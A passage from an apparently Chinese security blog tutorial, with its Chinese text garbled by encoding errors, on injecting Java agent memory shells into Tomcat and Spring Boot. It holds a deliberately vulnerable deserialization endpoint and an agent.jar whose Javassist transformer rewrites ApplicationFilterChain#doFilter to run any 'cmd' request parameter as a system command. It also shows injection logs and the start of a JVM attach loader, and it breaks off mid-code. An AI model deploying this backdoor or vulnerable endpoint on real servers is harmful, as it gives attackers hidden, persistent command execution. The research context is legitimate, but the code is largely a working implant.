<p>ï¼ˆä¸ºäº†é˜²æ­¢ä¸€äº›è«åå…¶å¦™çš„é”™è¯¯ï¼Œä½¿ç”¨äº†ç»å¯¹è·¯å¾„ï¼‰</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525851.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>æ³¨å…¥æˆåŠŸ</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523146.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>Tomcat æ—¥å¿—ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs plain">// Agent å·²ç»è¢«æˆåŠŸåŠ è½½åˆ°ç›®æ ‡ JVM ä¸­ï¼Œagentmain() è¢«è°ƒç”¨ï¼Œæ³¨å…¥æˆåŠŸ<br>AgentMemShell Injected!<br><br>//å¯¹å¤šä¸ªå·²åŠ è½½ï¼ˆloadedï¼‰ä¸”ç»§æ‰¿è‡ª HttpServlet çš„ç±»æ‰§è¡Œäº† retransformClasses()ï¼Œå¹¶ä¸”è¿™äº›å­ç±»éƒ½æˆåŠŸè¢«é‡è½¬æ¢ï¼ˆretransform successï¼‰<br>Found HttpServlet subclass: class org.apache.jsp.index_jsp<br>Retransform subclass Success: class org.apache.jsp.index_jsp<br>Found HttpServlet subclass: class com.src.testtomcat.HelloServlet<br>Retransform subclass Success: class com.src.testtomcat.HelloServlet<br>Found HttpServlet subclass: class org.apache.jasper.runtime.HttpJspBase<br>Retransform subclass Success: class org.apache.jasper.runtime.HttpJspBase<br>Found HttpServlet subclass: class org.apache.jasper.servlet.JspServlet<br>[Debug] Loading class: org/apache/jasper/servlet/JspServlet<br>Retransform subclass Success: class org.apache.jasper.servlet.JspServlet<br>Found HttpServlet subclass: class org.apache.catalina.servlets.DefaultServlet<br>[Debug] Loading class: org/apache/catalina/servlets/DefaultServlet<br>Retransform subclass Success: class org.apache.catalina.servlets.DefaultServlet<br><br>//æˆåŠŸå¯¹ javax.servlet.http.HttpServletï¼ˆåŸºç±»ï¼‰ åšäº† transformï¼ˆæ’å…¥/ä¿®æ”¹å­—èŠ‚ç ï¼‰ï¼Œå¹¶æŠŠä¿®æ”¹ç”Ÿæ•ˆäº†ï¼ˆretransform successï¼‰<br>Found HttpServlet (base): class javax.servlet.http.HttpServlet<br>[Debug] Loading class: javax/servlet/http/HttpServlet<br>[+] Found target class: javax.servlet.http.HttpServlet<br>[+] Start transforming HttpServlet...<br>[+] HttpServlet Transformed Complete.<br>Retransform HttpServlet Success.<br><br>//transform() è°ƒç”¨ä¸­æŠ›å‡ºäº† NullPointerException<br>[!] Transform failed: java.lang.NullPointerException<br>java.lang.NullPointerException<br>	at com.src.agent.ServletTransformer.transform(ServletTransformer.java:28)<br>	at sun.instrument.TransformerManager.transform(TransformerManager.java:188)<br>	at sun.instrument.InstrumentationImpl.transform(InstrumentationImpl.java:428)<br>	at sun.misc.Unsafe.defineAnonymousClass(Native Method)<br>	at java.lang.invoke.InnerClassLambdaMetafactory.spinInnerClass(InnerClassLambdaMetafactory.java:326)<br>	at java.lang.invoke.InnerClassLambdaMetafactory.buildCallSite(InnerClassLambdaMetafactory.java:194)<br>	at java.lang.invoke.LambdaMetafactory.metafactory(LambdaMetafactory.java:304)<br>	at java.lang.invoke.CallSite.makeSite(CallSite.java:302)<br>	at java.lang.invoke.MethodHandleNatives.linkCallSiteImpl(MethodHandleNatives.java:307)<br>	at java.lang.invoke.MethodHandleNatives.linkCallSite(MethodHandleNatives.java:297)<br>	at org.apache.tomcat.util.http.Parameters.addParameter(Parameters.java:212)<br>	at org.apache.tomcat.util.http.Parameters.processParameters(Parameters.java:390)<br>	at org.apache.tomcat.util.http.Parameters.processParameters(Parameters.java:481)<br>	at org.apache.tomcat.util.http.Parameters.handleQueryParameters(Parameters.java:194)<br>	at org.apache.catalina.connector.Request.parseParameters(Request.java:2938)<br>	at org.apache.catalina.connector.Request.getParameter(Request.java:1088)<br>	at org.apache.catalina.connector.RequestFacade.getParameter(RequestFacade.java:309)<br>	at javax.servlet.http.HttpServlet.service(HttpServlet.java)<br>	at javax.servlet.http.HttpServlet.service(HttpServlet.java:623)<br>	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:199)<br>	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:144)<br>	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:51)<br>	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:168)<br>	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:144)<br>	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:168)<br>	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:90)<br>	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:482)<br>	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:130)<br>	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:93)<br>	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:656)<br>	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)<br>	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:346)<br>	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:397)<br>	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)<br>	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:935)<br>	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1792)<br>	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)<br>	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1189)<br>	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:658)<br>	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:63)<br>	at java.lang.Thread.run(Thread.java:745)<br></code></pre></td></tr></table></figure>



<p>å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼š</p>
<p>ï¼ˆï¼šä½†æ˜¯å½“å‰çš„å†…å­˜é©¬åªæ˜¯éƒ¨åˆ†ç”Ÿæ•ˆï¼Œ&#x2F;hello-servlet è·¯å¾„å¯ä»¥æ‰§è¡Œï¼Œå…¶ä»–ä¸å¯ä»¥</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523380.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523450.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h3 id="4-3-2-æ–¹å¼äºŒ"><a href="#4-3-2-æ–¹å¼äºŒ" class="headerlink" title="4.3.2 æ–¹å¼äºŒ"></a>4.3.2 æ–¹å¼äºŒ</h3><h4 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h4><p>SpringBoot 2.6.13  </p>
<p>CommonCollection 3.2.1</p>
<p>æ­å»ºä¸€ä¸ªååºåˆ—åŒ–ç¯å¢ƒï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.demos.web;<br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentFilter</span> &#123;<br><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/cc&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">cc11Vuln</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span>  request.getInputStream();<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(inputStream);<br>        objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello,World&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/demo&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">demo</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;This is OK Demo!&quot;</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>



<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525866.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h4 id="å¯»æ‰¾å…³é”®ç±»"><a href="#å¯»æ‰¾å…³é”®ç±»" class="headerlink" title="å¯»æ‰¾å…³é”®ç±»"></a>å¯»æ‰¾å…³é”®ç±»</h4><p>åœ¨Filterä¸­å­˜åœ¨doFilteræ–¹æ³•ï¼Œé™¤äº†ä¼šå¯¹æˆ‘ä»¬çš„è¯·æ±‚è¿›è¡Œè¿‡æ»¤ï¼Œä¼šä¾æ¬¡è°ƒç”¨FilterChainsä¸­çš„Filterï¼ŒåŒæ—¶åœ¨ <code>ApplicationFilterChain#doFilter</code> ä¸­è¿˜å°è£…äº†æˆ‘ä»¬ç”¨æˆ·è¯·æ±‚çš„ request å’Œ response ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ³¨å…¥è¯¥æ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸å°±å¯ä»¥ç›´æ¥è·å–ç”¨æˆ·çš„è¯·æ±‚ï¼Œå°†æ‰§è¡Œç»“æœå†™åœ¨ response ä¸­è¿›è¡Œè¿”å›ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523934.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h4 id="ååºåˆ—åŒ–æ³¨å…¥"><a href="#ååºåˆ—åŒ–æ³¨å…¥" class="headerlink" title="ååºåˆ—åŒ–æ³¨å…¥"></a>ååºåˆ—åŒ–æ³¨å…¥</h4><p>æ³¨å…¥æµç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li>ç¼–å†™ agent.jar ä»è€Œå®ç° <code>org.apache.catalina.core.ApplicationFilterChain#doFilter</code> è¿›è¡Œå­—èŠ‚ç ä¿®æ”¹</li>
<li>åˆ©ç”¨ <code>CCä¾èµ–</code> çš„ååºåˆ—åŒ–æ¼æ´å°†æˆ‘ä»¬çš„åŠ è½½ä»£ç æ‰“è¿›å»ï¼Œç„¶åä½¿å…¶æ‰§è¡Œæ¥åŠ è½½æˆ‘ä»¬çš„ agent.jar</li>
</ol>
<h4 id="agent-jar"><a href="#agent-jar" class="headerlink" title="agent.jar"></a>agent.jar</h4><p>pom.xml </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.src<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Demo02<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.29.2-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure>



<p>AgentMain.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentMain</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">ClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String agentArgs, Instrumentation ins)</span> &#123;<br>        ins.addTransformer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DefineTransformer</span>(),<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// è·å–æ‰€æœ‰å·²åŠ è½½çš„ç±»</span><br>        Class[] classes = ins.getAllLoadedClasses();<br>        <span class="hljs-keyword">for</span> (Class clas:classes)&#123;<br>            <span class="hljs-keyword">if</span> (clas.getName().equals(ClassName))&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    <span class="hljs-comment">// å¯¹ç±»è¿›è¡Œé‡æ–°å®šä¹‰</span><br>                    ins.retransformClasses(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;clas&#125;);<br>                &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>DefineTransformer.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DefineTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">ClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer) &#123;<br>        className = className.replace(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;.&quot;</span>);<br>        <span class="hljs-keyword">if</span> (className.equals(ClassName))&#123;<br>            System.out.println(<span class="hljs-string">&quot;Find the Inject Class: &quot;</span> + ClassName);<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">CtClass</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> pool.getCtClass(className);<br>                <span class="hljs-type">CtMethod</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;doFilter&quot;</span>);<br>                m.insertBefore(<span class="hljs-string">&quot;javax.servlet.http.HttpServletRequest req =  request;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;javax.servlet.http.HttpServletResponse res = response;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;java.lang.String cmd = request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +<br>                        <span class="hljs-string">&quot;if (cmd != null)&#123;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;    try &#123;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        String line;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        StringBuilder sb = new StringBuilder(\&quot;\&quot;);\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        while ((line=reader.readLine()) != null)&#123;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;            sb.append(line).append(\&quot;\\n\&quot;);\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        &#125;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        response.getOutputStream().print(sb.toString());\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        response.getOutputStream().flush();\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        response.getOutputStream().close();\n&quot;</span> +<br>                        <span class="hljs-string">&quot;    &#125; catch (Exception e)&#123;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        e.printStackTrace();\n&quot;</span> +<br>                        <span class="hljs-string">&quot;    &#125;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;&#125;&quot;</span>);<br>                <span class="hljs-type">byte</span>[] bytes = c.toBytecode();<br><br>                c.detach();<br><br>                <span class="hljs-keyword">return</span> bytes;<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0</span>];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>maven æ‰“åŒ…å å¾—åˆ°çš„ target&#x2F;Demo02-1.0-SNAPSHOT.jar  å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„ agent.jar</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523970.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>ç¼–å†™javaä»£ç æ¥å°†å…¶åŠ è½½è¿›JVMä¸­</p>
<p>å…¶ä¸­å¤§è‡´æ€è·¯ä¸ºè·å–åˆ°JVMçš„PIDï¼Œè°ƒç”¨ loadAgent æ–¹æ³•å°† agent.jar æ³¨å…¥</p>
<h4 id="InjectMain-java"><a href="#InjectMain-java" class="headerlink" title="InjectMain.java"></a>InjectMain.java</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InjectMain</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            java.lang.<span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;D:\\JavaCode\\å†…å­˜é©¬\\AgentMem\\Demo02\\target\\Demo02-1.0-SNAPSHOT.jar&quot;</span>;<br>            java.io.<span class="hljs-type">File</span> <span class="hljs-variable">toolsPath</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.File(System.getProperty(<span class="hljs-string">&quot;java.home&quot;</span>).replace(<span class="hljs-string">&quot;jre&quot;</span>,<span class="hljs-string">&quot;lib&quot;</span>) + java.io.File.separator + <span class="hljs-string">&quot;tools.jar&quot;</span>);<br>            java.net.<span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> toolsPath.toURI().toURL();<br>            java.net.<span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URLClassLoader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL[]&#123;url&#125;);<br>            Class<span class="hljs-comment">/*&lt;?&gt;*/</span> MyVirtualMachine = classLoader.loadClass(<span class="hljs-string">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);<br>            Class<span class="hljs-comment">/*&lt;?&gt;*/</span> MyVirtualMachineDescriptor = classLoader.loadClass(<span class="hljs-string">&quot;com.sun.tools.attach.VirtualMachineDescriptor&quot;</span>);<br>            java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">listMethod</span> <span class="hljs-operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="hljs-string">&quot;list&quot;</span>,<span class="hljs-literal">null</span>);<br>            java.util.List<span class="hljs-comment">/*&lt;Object&gt;*/</span> list = (java.util.List<span class="hljs-comment">/*&lt;Object&gt;*/</span>) listMethod.invoke(MyVirtualMachine,<span class="hljs-literal">null</span>);<br><br>            System.out.println(<span class="hljs-string">&quot;Running JVM list ...&quot;</span>);<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;list.size();i++)&#123;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> list.get(i);<br>                java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">displayName</span> <span class="hljs-operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span 